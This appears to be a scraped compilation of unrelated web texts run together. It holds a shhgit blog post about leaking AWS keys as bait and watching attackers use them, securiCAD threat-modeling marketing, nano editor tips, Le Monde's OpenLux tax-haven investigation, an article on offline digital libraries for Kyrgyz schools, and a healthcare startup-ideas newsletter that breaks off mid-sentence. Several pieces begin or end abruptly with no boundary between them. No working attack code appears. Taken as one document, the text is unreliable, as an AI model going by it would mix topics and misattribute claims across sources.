<li><strong><a href="https://hackerone.com/reports/858915" target="_blank" rel="nofollow">Shopify</a></strong>'s leakage of a CircleCI API token on GitHub allowed for further access to private code repositories and their secrets within.</li>
</ol>
<p>Finding these secrets is what we do. Shhgit finds <strong>over 165,000 secrets every day single</strong> across public GitHub, GitLab and Bitbucket repositories. More than half of these are valid and live. And our data suggests it is an ever increasing problem that often goes unnoticed. You can catch a small glimpse of the scale of the problem <a href="https://www.shhgit.com/#product" target="_blank" rel="nofollow">on our homepage</a>:</p>
<p><img src="https://www.shhgit.com/235b382bba432df2fdeadf8cd47ae7d9/publicfeed.gif"></p>
<h4>Code as an attack vector</h4>
<p>But what happens immediately after leaking secrets? To find out we purposely leaked valid Amazon AWS credentials to a public GitHub repository. We chose to leak AWS keys because we know they are highly sought after by fraudsters with all sorts of different motives — espionage, spamming, financial gain or blackmail. But we didn't quite realise how quickly it would happen...</p>
<p>We wanted to limit our liabilities as much as possible, even though we used a new AWS account loaded with free credits. We definitely do not want to be end up <a href="https://www.quora.com/My-AWS-account-was-hacked-and-I-have-a-50-000-bill-how-can-I-reduce-the-amount-I-need-to-pay" target="_blank" rel="nofollow">footing a huge bill</a> for this experiment. AWS' Cost Management tool alerts you if you go over a set budget but it will not stop you from going past it. To be on the safe side we created a script to automatically destroy any new EC2 instances <em>(servers)</em> shortly after their creation. This gives us enough time to forensically capture the server and analyse what the hackers were doing.</p>
<ol>
<li>
<p><strong>(15:12 UTC)</strong> First, we created a new <abbr title="AWS' Identity and Access Management tool">IAM</abbr> user and attached basic <abbr title="AWS' file storage platform known as buckets">S3</abbr> read and <abbr title="A fancy name for servers">EC2</abbr> policies. This means the account will only have permissions to access our file storage and spin up new cloud servers. We then published the AWS secret keys to a new GitHub repository.</p>

<p>Amazon automatically revokes exposed keys by applying a special policy called <em>AWSCompromisedKeyQuarantine</em>. This effectively prevents bad actors from using the key. But it somewhat renders our experiment useless if the keys can't be used. We knew this would happen beforehand so we created a simple script to automatically remove the quarantine policy if found <em>(tip: never do this)</em>. Now we just wait for fraudsters to take the bait.</p>
</li>
<li>
<p><strong>(15:17 UTC)</strong> Shhgit happened to be monitoring all activity by the user who leaked the secrets, so a minute later we received an e-mail alert of the leak.</p>

<p><strong>(15:18 UTC)</strong> A minute later we detected a flurry of activity on the key from an IP address based in the Netherlands. Threat intelligence feeds associates the IP address with spamming, exploitation of Windows hosts, and running a TOR exit node.</p>

<p>The first batch of commands helps the attacker understand the lay of the land. Shortly after the bad actor spun-up two <em>c6g.16xlarge</em> EC2 instances — AWS' most powerful compute instance. Undetected this would have costed us thousands of dollars a month. Any guesses on motives?</p>
<p>Cryptomining.</p>
<p>We analysed the server afterwards and it was a base install of Ubuntu with XMRig installed which is used to mine for $XMR (Monero) — nothing overly exciting.</p>
</li>
<li>
<p><strong>(15:54 UTC)</strong> Shortly after, another actor with an Israeli residential IP address used the secrets to access our S3 buckets (file storage) and download its entire contents (which we filled with random data). We booby-trapped some of the files with tracking pixels but unfortunately none of them triggered.</p>

<p>One attacker who copied the files from our S3 buckets started a live chat conversation through the shhgit.com homepage (the bucket was named shhgit) — a snippet of the conversation below.</p>

<p>Ultimately this ends up in a demand for money to pay him for his services in finding the 'bug'. We politely declined his generous offer. We believe this could have quickly turned in to an extortion attempt if the files were worth any value.</p>
</li>
<li>In total, the leaked secrets were used to access the AWS account 13 times over a 24 hour period. 4 of the attackers carried out actions similar to the above. The remaining 9 seemingly only verified if the credentials were valid (i.e. check if they could login). We presume to be either manually reviewed later or sold on a darknet forum.</li>
</ol>
<h4>6 minutes to compromise</h4>
<p>It look just 6 minutes for the malicious actor to find the leaked credentials on GitHub and compromise our AWS account. So why did we say 'in less than a minute' at the beginning of the post? Attacks like this are made possible by GitHub's "real time" feed. Every fork, code commit, comment, issue and pull request is fed in to a public events stream. Bad actors watch this stream to identify new code and scan it for secrets. GitHub delays the feed by 5 minutes — presumably for security reasons — making the <strong>earliest</strong> possible time a bad actor could have captured the secrets 15:17 UTC, 5 minutes after committing them.</p>
<h4>Keeping <em>your</em> secrets, secret</h4>
<p>Fraudsters <em>are</em> scanning public code repositories for your secrets. They are counting on you, or your team, or your suppliers, or your contractors, to mess up and take full advantage of it. As with all security controls, a defence in depth approach is always best so consider implementing the following:</p>
<ol>
<li>Don't put your secrets in your code in the first place. Secrets Management solutions such as <a href="https://www.vaultproject.io/use-cases/secrets-management" target="_blank" rel="nofollow">HashiCorp Vault</a> can help you here — think environment variables crossed with your password manager in your CI/CD pipelines.</li>
<li>Whilst Amazon caught and revoked our AWS keys shortly after them being committed, this isn't true for all secret types (e.g., database connection strings) or platforms (e.g., GitLab and Bitbucket). Strengthen your DevSecOps strategy with automated secrets detection to alert you if shhgit hits the fan. We happen to be really good at that.</li>
<li>Gain visibility of your code and understand where it sits and how it is secured. This is especially true if you have large teams or contractors distributed across many systems. A good first step is to monitor public GitHub, GitLab and Bitbucket streams. We happen to be really good at that too.</li>
<li>Implement the principle of least privilege across your secrets. Only grant them permissions needed to carry out their specific function and ensure they are only valid for as short as possible. Implement a zero trust model and plan for the worse by taking the position that your secrets <em>will</em> be breached. This will greatly mitigate the impact if any secrets are leaked.</li>

Threat Modeling can be conducted both in the design/development phases and for live system environments.

<div>
<p>On the question “Who should threat model?” the <a href="https://www.threatmodelingmanifesto.org/">Threat Modeling Manifesto</a> say “You. Everyone. Anyone who is concerned about the privacy, safety, and security of their system.” While we do agree with this principle in the long term, we want to nuance the view and highlight the need for automation.&nbsp;</p>

<h3>Threat Modeling in development:</h3> </p>
</div>
<div data-id="9ef68c3" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p>This is the ”base case” for Threat Modeling. Threat modeling is typically conducted from the design phase and onward in the development process. It is rational and common to do it more thorough for high criticality systems and less thorough for low criticality systems. Threat modeling work is typically done by a combination of development/DevOps teams and the security organization.</p><p>More mature organizations typically have more of the work done by the development/DevOps teams and the less mature organizations have more work support from the security organization.&nbsp;&nbsp;<b data-stringify-type="bold"><br></b></p></div>

<h3>Threat Modeling of live environments:</h3> </p>
</div>
<div data-id="6592e7d" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>Many organizations also do threat modeling on their live environments. Especially for high criticality systems. As with the Threat Modeling in development, organizations have organized the work in different ways. Here, the work is typically done by a combination of operations/DevOps teams and security organization. Naturally, it is advantageous when Threat Models fit together and evolves over time from development through operations and DevOps cycles.</p>

<h2>Typical Challenges with Threat Modeling</h2> </p>
</div>
<div data-id="c8bf9f5" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<div><p>Threat Modeling can create all these truly great values. So how come it is today typically conducted by the most security aware companies only? Why doesn’t everyone threat model?&nbsp;One part of the answer is that threat modeling is <b data-stringify-type="bold">complex</b>. Conducting Threat Modeling analyses at a valuable level of detail require a <b data-stringify-type="bold">high level of expertise</b> – security and IT – as well as very<b data-stringify-type="bold"> strong computational capacity</b> in conducting highly complex attack path analyses.&nbsp;&nbsp;</p><p>The other part of the answer is that <b data-stringify-type="bold">Threat Modeling until today typically is conducted manually.</b> Conducting Threat Modeling manually require significant skills, is subject to analysis personal bias, and require significant time if doing anything more than just a very high-level analysis.&nbsp;&nbsp;</p><p><strong>Another way of putting this is that users can benefit hugely by improved tooling</strong>. We today have a number of different frameworks available that guides the modeler. These serve as good checklists. But, what in our view is the core work – the attack path analyses, the risk analyses, and the risk mitigation effectiveness analyses – still need to be conducted manually, which is a huge task in all systems of any significant size. Hence, it is to date only the most security aware companies that conduct threat modeling. And many companies conducting threat modeling do it at a high level only, which create just a very small part of the value.&nbsp;&nbsp;</p></div>

<div data-id="1fc0c65" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>securiCAD is the leading tool for Automated Threat Modeling and Attack Simulations.&nbsp; securiCAD does the “heavy lifting” in Threat Modeling for you, conducts the advanced attack path analyses, the risk analyses, and the risk mitigation effectiveness analyses and provides you and your organization with the key insights to take pin-pointed, highly effective risk mitigation actions when needed.</p>

<div data-id="4bbc1b1" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>Generate a digital twin model of your environment by importing data from your available data sources – configs, vulnerability scans, firewall rules etc. Or create an infrastructure model of the system environment you are planning to build. securiCAD then automatically creates the attack graph threat model based on your infrastructure model.</p>

<h3>Automated Attack Simulations! </h3> </p>
</div>
<div data-id="c8eb869" data-element_type="widget" data-widget_type="text-editor.default">
<div>
<p>This is the very core strength of securiCAD. When the model has been created, securiCAD conducts attack simulations on the model. The virtual attacker try all potential means to reach and compromise the high value assets in the model. It identifies the potential paths that an attacker can use to reach the high value assets. It provides insights into your cyber posture – how hard it is for attackers to reach your high value assets, and what paths are the easiest and harder for the attacker to pursue. And based on the simulations, the tool suggests risk mitigation actions, and enables the user to identify the most effective measures to improve their security levels when needed</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<p>for years nano has been nothing but a mockery for those who use emacs or vim.  a friendly and pragmatic editor?  what a laughable prospect.
</p><p>well this is where it ends.  nano is a friendly and pragmatic editor, but it's no notepad.  nano has depth.  let's take a look.
</p><h2> indentation</h2>
<p>we'll start with something simple.  nano can be set to vi-like auto indentation with M-I.  Here M refers to the alt key, and I refers to an unshifted i.  with this enabled, nano will copy any whitespace from the beginning of the current line onto the next line when you hit return.
</p><p>you can make this permanent by adding "set autoindent" to you $XDG_CONFIG_HOME/nano/nanorc file.
</p><h2> searching</h2>
<p>i just want to clear up searching, as i've seen a few people have trouble with the bindings.  ^W initiates a forward search and prompts you for a string.  ^Q initiates a search backwards in the same way.  M-W and M-Q move forwards and backwards through the search occurences.  searching wraps.
</p><h2> backups</h2>
<p>some people say backups are unnecessary if you use version control.  i say that they have different uses.  here's what you need:
</p><pre>set backup
set backupdir "~/.cache/nano/backups"
</pre>
<p>every time you save, a new backup is added.  maybe you won't use them.  backups have saved me before.
</p><h2> linting</h2>
<p>nano comes with support for linting a few languages.  if yours isn't supported, add something like the following to your config file:
</p><pre>extendsyntax sh linter dash -n
</pre>
<p>"sh" should be the name of the syntax file you want it to apply to.  "dash -n" should be the linting command.  you can run the linter with M-B.  it works pretty nicely.
</p><h2> commenting and uncommenting lines</h2>
<p>M-3 comments or uncomments a line.  nano does in fact have a mark, which can be activated with M-A.  While the mark is active (text is highlighted), M-3 will comment or uncomment all the highlighted lines.
</p><h2> formatting</h2>
<p>nano has support for formatters.  as with the linter, this can be added to syntax which doesn't already have it with
</p><pre>extendsyntax go formatter gofmt -w
</pre>
<p>it copies the current file to a temporary file, runs the formatter on it, and if there are no errors copies the new file back.  you can run it with M-F.
</p><h2> higher level movement</h2>
<p>everyone knows how to move up and down, left and right.  nano can also move in blocks with C-Up and C-Down and in brackets with M-].
</p><p>nano also has anchors.  an anchor can be put on any line with M-Ins.  If you enable line numbers with M-N, you can see a diamond on lines with anchors.  you can navigate between anchors with M-PgUp and M-PgDown.  i like to use this with the mark.
</p><h2> regular expressions</h2>
<p>add "set regexp" to your nanorc and you will be able to use regular expressions in searches.
</p><h2> macros</h2>
<p>nano has macros.  M-: starts and ends recording a macro.  M-; plays back a macro.  it's enough for most things i use macros for.  i find it useful to "set stateflags", which puts a "R" in the top right of the screen while a macro is being recorded.  it also puts an asterisk next to the filename when it has been changed from disk.
</p><h2> buffers</h2>
<p>M-← and M-→ navigate between buffers.  i normally use a buffer for what i'm editing, and a scratch buffer for commands and notes.
</p><h2> external commands</h2>
<p>^T runs an external command, and puts the output where the cursor is.  pressing M-F at the prompt will put the output into a new buffer.
</p><p>prepending a command with "|" will give the selected region as the command input, and replace it with the command output.
</p><h2> conclusion</h2>
<p>those were some of the things that you can do with nano that a lot of people don't seem to realise.  it is definitely not up to the level of vim or emacs, but it is a very capable editor.  maybe if we dropped the elitism and actually read the manual like we preach so much we would appreciate the diversity in tools we can use.

What would we find if we opened the safe of this tiny State located in the heart of the European Union, listed by many researchers in the world’s top&nbsp;5 tax havens&nbsp;? The OpenLux investigation, conducted by <em>Le Monde</em> along with ten media partners for more than a year, provides answers&nbsp;: 55,000&nbsp;offshore companies managing assets worth at least 6&nbsp;trillion euros.</p>          <p>These phantom companies without offices or employees were created by billionaires, multinationals, sportsmen, artists, high-ranking politicians and even royal families. Luxembourg acts as a magnet for the wealth of the world&nbsp;: in a territory of 2,586&nbsp;km2, Tiger Woods and Cristiano Ronaldo rub shoulders with Shakira and the King of Bahrain. Hundreds of multinationals (LVMH, Kering, Altice, Pfizer, Amazon…) have opened financial subsidiaries. Wealthy families increase their real estate assets there.</p>            <p>More surprisingly, OpenLux reveals that questionable funds, suspected of originating in criminal activity or linked to criminals targeted by judicial investigations, have been concealed in Luxembourg. This is the case of companies linked to the Italian Mafia, the’Ndrangheta, and the Russian underworld. The League, Italy’s far-right party, has hidden a secret fund which is sought by the Italian authorities. People close to the Venezuelan regime have recycled corrupt government procurement funds.</p>          <p>To conduct this investigation, <em>Le Monde </em>has compiled a huge database that lists the beneficiaries of the 124.000&nbsp;commercial companies registered in Luxembourg, i.e. their true owners, along with 3.3&nbsp;million administrative acts and financial reports. These are documents that have recently been made public, but are only available on the Luxembourg trade register website. <em>Le Monde </em>was able to extract them in their entirety for analysis, in partnership with the <em>Suddeutsche</em> <em>Zeitung </em>in Germany, <em>Le Soir</em> in Belgium, McClatchy in the United States, Woxx in Luxembourg, <em>IrpiMedia</em> in Italy, and the OCCRP Consortium of investigative journalists.</p>          <h2>157 nationalities represented</h2>          <p>These investigations confirm that the Grand Duchy is, contrary to what the Luxembourg authorities claim, a veritable offshore centre, halfway between the City of London and the British Virgin Islands. Nearly 90&nbsp;% of its <em>«&nbsp;companies&nbsp;»</em> are controlled by non-Luxembourgers. Among the 157&nbsp;nationalities represented in this amazing <em>«&nbsp;Who’s who&nbsp;»</em>, the French stand out&nbsp;: they head the list with, in total, more than 17.000 companies<strong>.</strong></p>            <p>What they house is surprising&nbsp;: valuable property, here a castle near Paris owned by a Saudi prince, there a vineyard in Provence owned by Angelina Jolie and Brad Pitt, and an endless list of villas on the French Riviera and well-appointed Parisian apartments. But also flagships of the French economy, such as Yves Rocher, Chanel, JCDecaux and Decathlon. It’s almost as if Luxembourg owned small pieces of France.</p>                     <p>The case of France is not isolated&nbsp;: it is also through Luxembourg companies that some investment funds buy whole swathes of cities such as Berlin and London, causing real estate prices to rocket without being identifiable or paying taxes. The list of international assets held in Luxembourg is a gigantic inventory, including luxurious residences, chalets, yachts, helicopters, private jets and big planes, music catalogues, the rights to images, works of art, in short, the list is endless.</p>          <p>In total, as confirmed by the list of 64,458&nbsp;beneficiaries identified by OpenLux&nbsp;: the Grand Duchy of Luxembourg concentrates a large part of the world’s wealth. It is home to at least 279 of the more than 2,000&nbsp;billionaires listed by <em>Forbes</em> magazine. But also 37 of the 50&nbsp;wealthiest French families, such as the Mulliez, Guerrand-Hermès and Bernard Arnault, who structure their group, their assets and their investments through dozens of Luxembourg holding companies.</p>          <h2>A prime location for tax planning</h2>          <p>There are various reasons for choosing Luxembourg&nbsp;: a central position in the European Union, high-quality financial engineering, financial regulations tailored to business, direct access to the country’s institutions, and political stability. But let there be no mistake&nbsp;: the first reasons are taxation and discretion. They are the result of political choices dating back to the time of former Prime Minister, Jean-Claude Juncker (1995-2013), who later became President of the European Commission.</p>            <p>Luxembourg has certainly turned its back on its former tax rescripts, these ultra- advantageous arrangements granted to large multinationals, following the revelations on the subject in 2014 by the <em>«&nbsp;LuxLeaks&nbsp;»</em> investigation. But it remains a hotbed of tax planning for companies and wealthy individuals through preferential tax regimes. This encourages, in some cases, abuse and, possibly, fraud.</p>          <p>The scale of the financial centre is such that the Grand Duchy seems, moreover, insufficiently equipped to guarantee effective control over all the flows it handles. Its services seem to be more calibrated to the size of the country than to its offshore activity. The trade register has only 59&nbsp;employees to enforce the legal obligation to declare the actual beneficiaries of more than 100.000&nbsp;entities and to carry out an initial control of the declarations. The Financial Sector Supervisory Commission (CSSF) has only 900 employees, even though the financial sector accounts for a quarter of the country’s economy.</p>          <p>Of course, Luxembourg is not the only country to have entered the race for the lowest tax bill. But this is the first time that an investigation has exhaustively documented the phenomenon, through the analysis of the microeconomic fabric of a State.</p>          <blockquote> <p>The many flaws discovered by the OpenLux investigation question the ability of States to effectively monitor their financial ecosystem</p> </blockquote>         <p>This truth operation would not have been possible without a directive voted by the European Union in 2018, which required the creation of public registers of the real owners of companies in all member states. This historic reform came after a decade of financial scandals, culminating in the <em>«&nbsp;Panama papers&nbsp;»</em> in 2016, that revealed the extent of the role played by opaque companies and offshore arrangements in laundering criminal activities, including tax fraud. A decade in which at the same time anti-corruption judges and tax authorities saw their investigations coming up against front companies and front men.</p>            <p>Luxembourg was one of the first to apply the European directive, making its register public in autumn 2019. In a way, it is therefore paying the price of transparency. The many flaws discovered by the OpenLux investigation question the ability of States to effectively monitor their financial ecosystem by guaranteeing the reliability of these registers. For example, almost half of the companies, funds and foundations registered in Luxembourg have no real identifiable beneficiaries to date. However, as the European directive states, <em>«&nbsp;public access to information on the actual recipients allows greater control of information by civil society (…) and helps to preserve confidence in the integrity of commercial transactions and the financial system&nbsp;»</em>.</p>                                 </section>    </article></div>]]>

<p>Zhazgul Zuridinova hikes for fun almost every month, but trekking the narrow mountain pass to Zardaly, a remote village near Kyrgyzstan’s southwest border, still makes her anxious. The 12-kilometer trail carved through the barren rocks is unpaved and bridged by wooden planks. One misstep could send her tumbling down the steep cliffs, a fate that has befallen many locals over the years.</p>



<p>“Zardaly is a place that no one goes to,” said Zuridinova, a 28-year-old project manager from Bishkek, the capital. “They don’t have the internet or electricity. While all the world is changing, they’re still living in the past, like a hundred years ago.”</p>



<p>It was Zardaly’s isolation that brought Zuridinova, two colleagues, and a donkey there last November. All three are employees of the Internet Society, a nonprofit that builds community broadband networks and teaches digital literacy around the world. Their aim was to bring the internet to the local school’s dozen students — who had been cut off from education during the coronavirus pandemic — using a tissue-box-sized digital library called Ilimbox.&nbsp;</p>



<p>The Ilimbox, whose name translates to “science in a box,” stores 500 books, 250 videos, and 4 million Wikipedia articles in Kyrgyz, Russian, and English. The device is only an interim solution for the lack of an internet connection — a thin facsimile of being online, but it has become a lifeline for students in the most remote areas of Kyrgyzstan, who faced being left behind <a href="https://www.unicef.org/kyrgyzstan/stories/lights-camera-action">when the country moved to e-learning last year</a>.&nbsp;</p>



<p>“It’s a window for a person who wants to access knowledge,” Zuridinova said. “It’s not the door.”</p>



<p>Building internet infrastructure has been a great challenge in Kyrgyzstan, which is further away from an ocean than any other country in the world and is almost entirely mountainous — 94% of the country lies at over 1,000 meters altitude. That makes laying cables expensive and difficult. <a href="https://www.internetworldstats.com/asia.htm#kg">More than 60% of Kyrgyzstan’s population</a> is still not covered by any form of internet, and those with a connection are concentrated in a handful of urban areas.</p>



<p>Talant Sultanov, co-founder of the Internet Society’s Kyrgyzstan chapter, first came across the concept of the “internet-in-a-box” when he attended the 2016 Internet Governance Forum in Mexico. The devices — repositories of downloaded internet content that can be accessed by offline communities — were being used <a href="https://vimeo.com/195038843">to connect indigenous communities in the Yucatán peninsula</a>.</p>



<p>“That’s when it occurred to us that, in Kyrgyzstan, we had a similar situation,” Sultanov said. “And that’s when we decided to also apply this experience in Kyrgyzstan and bring the internet-in-a-box to schools and libraries in remote areas.”</p>



<p>With funding from international organizations and an endorsement from the Ministry of Education, the project team — which most of the time comprised Zuridinova and one other engineer — created an Android app and assembled the boxes using low-cost microcomputers and hard drives. When connected to a power source, the Ilimbox becomes a local Wi-Fi hot spot, which students can use to install the app and download the content stored on the drive. The app also functions as a PDF reader and video player, so there’s no need to download other apps.</p>

<p>Even though there is no data network in rural Kyrgyzstan, many people there have Android smartphones, which are often brought in by Kygrgyz migrant workers living in neighboring countries.&nbsp;</p>



<p>Choosing content was a challenge. Schools in rural Kyrgyzstan have suffered from a lack of textbooks and other learning materials in the local language. Higher education institutions increasingly prefer to use Russian or English. “[Rural schools] have to share books or get worn-out books, if they’re lucky. And oftentimes they don’t even have that,” Sultanov said. That didn’t give the Internet Society much to work with. “There really wasn’t much to choose from, so we were happy just for any content,” Sultanov said. “We’re beggars, not choosers.”</p>



<p>Wikipedia has been a surprisingly important source of their material. There are currently more than 80,000 articles on the Kyrgyz version of the site, the majority of which were written after 2010 in <a href="https://www.opensocietyfoundations.org/voices/und-44">an effort </a><a href="https://www.opensocietyfoundations.org/voices/und-44">organized</a> <a href="https://www.opensocietyfoundations.org/voices/und-44">by Kyrgyzstani social worker Chorobek Saadanbekov</a>, who mobilized academics and college students to translate Wikipedia articles from other languages. Saadanbekov said he was motivated by his own experience of growing up in the countryside and receiving education in only Kyrgyz. “And now I have hopes in our country,” he told <em>Rest of World</em>, “that if you only speak Kyrgyz, you can [still] access knowledge.”&nbsp;</p>



<p>Between 2017 and early 2020, the Internet Society delivered Ilimboxes to around 100 schools across the country. But the urgency of their efforts increased dramatically last March, when the Covid-19 pandemic forced schools across the country to close. In August, the Ministry of Education announced that, of all public schools in Kyrgyzstan, 2,106 were already connected to the internet, while the state-owned telecommunications company was laying fiber optic cables for 11 more. Twenty schools, however, would be left out, either because they had no electricity or there were plans to resettle villagers in the future.</p>



<p>“When we learned that,” Sultanov said, “we took it as a challenge and a goal — that we should definitely go to these villages first.”</p>



<p>The school in Zardaly was on the list. The village has around 100 families but no electricity, fixed internet, or mobile data. On November 2, Zuridinova and two colleagues arrived at Zardaly after hours of driving and walking. They brought with them an Ilimbox, a big solar panel, some batteries, and two solar-powered streetlamps. The digital library was placed in the primary school, the only public institution in the village, and 11 students between 7 and 12 came to learn how to use it.</p>



<p>Many older students already had a smartphone, but the team had learned in advance that the only girl in the school, Raiana, didn’t. So, two weeks before the trip to Zardaly, they posted a request on Facebook asking if someone could donate a used handset. A woman saw the post, cleaned and repaired her phone, and sent it to the Ilimbox team. “Thank you, sister,” said Raiana, holding the phone and the Ilimbox in a video recorded by Zuridinova. “I took the phone. I will study hard.”&nbsp;</p>



<p>In Chakmak-Suu, another village on the list, a cell tower put up four years ago offers relatively stable mobile connections. There, Aitunuk Talaibekova, a 15-year-old student, has been able to send homework to her teachers over WhatsApp and conduct searches on Google. However, most of the information she finds online is in Russian.</p>



<p>Because she reads much quicker in Kyrgyz, her native language, she had to use a physical dictionary to translate material she didn’t understand. The Ilimbox, installed in her school in October, gave her access to all the Krygyz language content scattered around the internet and put it in one place.</p>



<p>“Learning has become more interesting for me,” she told <em>Rest of World</em>. “I used Wikipedia to study the biographies of historical figures, authors, and poets, for example, to find their poems that we had in our lessons.” She also uses it to look up textbooks, so she can help her younger siblings with their homework.</p>



<p>With the last of the remote schools connected in November, the Ilimbox team is now planning to expand the program to include Kyrgyzstan’s <a href="https://www.akdn.org/project/bringing-kindergarten-high-pastures">recently created <em>jailoo</em> kindergartens,</a> which allow thousands of children to receive preschool education while they keep an eye on grazing sheep in the pastures. Zuridinova and her colleagues decided to include the jailoos after realizing that the Ilimboxes could work without access to the electrical grid.</p>



<p>Zuridinova says that, the next time they visit Zardaly, she wants to bring the real internet to the village. “We thought about going there to teach [them] how to use Booking.com for tourists, how to use e-commerce websites,” she said. “Not only bringing the internet there, but also teaching [them] how to use it for work, study, and other things.”</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>This week I did a collaboration with <a href="https://www.readthegeneralist.com/">The Generalist</a>. The Generalist is one of the few newsletters I read end-to-end every time because it’s important to learn how things work in normal businesses to understand which lessons/strategies can be imported to healthcare. </p><div><figure><a target="_blank" href="https://cdn.substack.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F50d569cf-b7a3-4111-910f-43a6c69cb2dc_2619x1388.png"><img src="https://cdn.substack.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fbucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com%2Fpublic%2Fimages%2F50d569cf-b7a3-4111-910f-43a6c69cb2dc_2619x1388.png" data-attrs="{&quot;src&quot;:&quot;https://bucketeer-e05bbc84-baa3-437e-9518-adb32be77984.s3.amazonaws.com/public/images/50d569cf-b7a3-4111-910f-43a6c69cb2dc_2619x1388.png&quot;,&quot;height&quot;:772,&quot;width&quot;:1456,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:317932,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:&quot;image/png&quot;,&quot;href&quot;:null}" alt=""></a></figure></div><p>We gathered a bunch of startup ideas from folks across the healthcare industry. I liked this because I am lazy and this didn’t require me to write anything. But also because the ideas people came up with were really good. Let me know what you think of them.</p><p><strong>ITA for healthcare</strong></p><p>Google acquired ITA Software, a company that tracked airline inventories, that would eventually underpin Google Flights. This software let any airline connect their inventory and enabled booking and dynamic pricing through the platform.</p><p>Healthcare needs something similar for surfacing real-time provider capacity at a national scale to facilitate efficient appointment booking. Scheduling in healthcare is still a mess. Each provider uses multiple scheduling systems, and no one has a comprehensive view into the overall appointment capacity of a given provider network. We also have an explosion of virtual care and home health companies that require another level of complex resource management and logistics coordination that needs to interface effectively with traditional providers. Creating a universal scheduling infrastructure would enable third-parties/startups to surface live availability in their apps and allow referring providers and consumers alike to utilize capacity more efficiently.&nbsp;</p><p>— <a href="https://twitter.com/julesyoo">Julie Yoo, General Partner at Andreessen Horowitz</a></p><p><strong>Live-streaming demo sales for DTC medical products</strong></p><p>COVID proved two things. One, patients are willing to adopt digital health technology, and two, despite this openness, they remain out of the loop and unaware of which products would best meet their needs.&nbsp;</p><p>I think there’s an opportunity to create a QVC-like live-streaming channel that features different healthcare products. The Sales Development Representatives (SDRs) of various startups could come onto the channel and explain their solution’s value. Patient reviews would be integrated, ensuring recommendations did not go unchecked, and the best products rose to the top.&nbsp;</p><p>All in all, a solution like this would make discovery more direct and interactive. It could prove especially popular among older generations accustomed to this kind of DTC sales approach.</p><p>— <a href="https://twitter.com/marioatx_md">Mario Amaro, MD, CEO at DocSpace</a></p><p><strong>Value-based care targeted by ethnicity</strong></p><p>Value-based care (VBC) is a healthcare model in which service providers are reimbursed based on the outcomes they achieve. It’s intended to better align the incentives between a healthcare provider like a hospital or clinic and the patient.&nbsp;</p><p>I think there’s room to innovate on this model by narrowing the focus area. In particular, I’d like to see a network of VBC primary care providers (PCPs) that focus on specific immigrant communities, bolstering its service accordingly. For example, this network could serve the Indian-American communities in Dublin, OH, the Persian-Americans in Los Angeles, CA, or the Arab-Americans in Dearborn, MI, Somalian-Americans in St Paul, MN, etc. Each center would incorporate relevant religious and cultural practices, impacting the food, ambiance, and presentation of care. Instead of being “culturally sensitive,” this network would be genuinely “culture-first.” The model would simultaneously cater to the caregivers -- the first generation children who will feel comfortable promoting and supporting having their parents be a part of this new community.&nbsp;</p><p>— <a href="https://www.linkedin.com/in/mishanasrollahzadeh/">Misha Nasrollahzadeh, Strategic Partnerships Lead at Ribbon Health</a></p><p><strong>A therapist to quarterback your day-to-day health needs</strong></p><p>Behavioral health (BH) still sits outside core primary care. Though access to BH services is increasing, and more primary care startups like OneMed and Tia are offering therapy alongside their primary care services, BH is fundamentally an "add on" service, often accessible only via referral. This feels very contrary to the massive amount of evidence for the mind-body connection and the increasing BH load in the US.&nbsp;</p><p>I believe there's an opportunity to re-think how behavioral health is integrated into primary care, where a therapist would be the intake point and "quarterback,” with PCPs and specialists reserved for truly clinical work. There would be several benefits, a major one being the ability to induce, track, and improve behavior change around health, which health-tech has struggled with. There would be more opportunities for "lower licensed" professionals to offer care (like social workers and coaches) and ideally decreased reliance on medication and procedures to address common health aberrations.&nbsp;</p><p>This is a big idea in the niche functional medicine and integrative therapy spaces, primarily for people with chronic conditions. But with telehealth and parity laws increasing, there could be a huge opportunity to build a system that expands access to this approach.&nbsp;</p><p>— <a href="https://twitter.com/shohinigupta">Shohini Gupta, APM at Oscar</a></p><p><strong>Distributed, therapeutically-specialized clinical research organizations (CROs)</strong></p><p>It’s no secret that pre-FDA approval biotech startups are little more than lightweight business and fundraising shells around a (typically outsourced) clinical trial machine. These clinical trial machines, known as Clinical Research Organizations (CROs)‚ are responsible for the vast majority of a biotech startup’s costs and have substantial fixed costs in physical site locations, medical and scientific staff, and payouts to patients. So it stands to reason that any intervention in reducing the cost of clinical trials has to start with the CRO.</p><p>As with any business, there are two levers to improving the CRO:</p><ol><li><p>Reduction of costs (table-stakes; where most CRO startups focus)</p></li><li><p>Increasing value-add</p></li></ol><p>A “CRO of the future” could innovate on both points.&nbsp;</p><p>Concerning cost-reduction, CROs should innovate on the model of distribution. Specifically, they can start to bring trials to patients, eliminate fixed site costs, and build economies of scale by focusing on a particular underserved therapeutic area (e.g., rare diseases; women’s health).</p><p>In terms of increasing value, it’s essential to understand that many biotech companies have only one or two shots on goal. They raise capital to try to bring a single compound to market, and if that compound fails in its particular formulation, the business dies. Recognizing this, a modern CRO should support startup partners by identifying other viable indication areas (e.g., dermatology) and formulations, helping them build a case to raise capital for additional, parallel trials. In addition to increasing the revenue of the CRO, this increases the likelihood that any single biotech startup will get the treatment approved, thereby reducing the time it takes for a treatment to get into the hands of patients."	</p><p>— <a href="https://www.twitter.com/provisionalidea">James Rosen-Birch, stealth startup founder; former Chief of Staff, Roivant Sciences; Sio Gene Therapies	</a></p><p><strong>Help tag and annotate de-identified images	</strong></p><p>One of the big barriers to training ML models is having structured, annotated image datasets. CAPTCHA has been deployed across the internet for security purposes and training datasets for things like autonomous cars. Having a medical-specific CAPTCHA for things like MRIs, CT Scans, Tissue Slides, and so on where physicians tag anomalies or guess the diagnosis could create a valuable, massively labeled dataset. This would need to be on platforms only physicians could access or rely on a verification system to ensure the person tagging is a physician.&nbsp;</p><p>This behavior could be incentivized through perks, like discount access to relevant 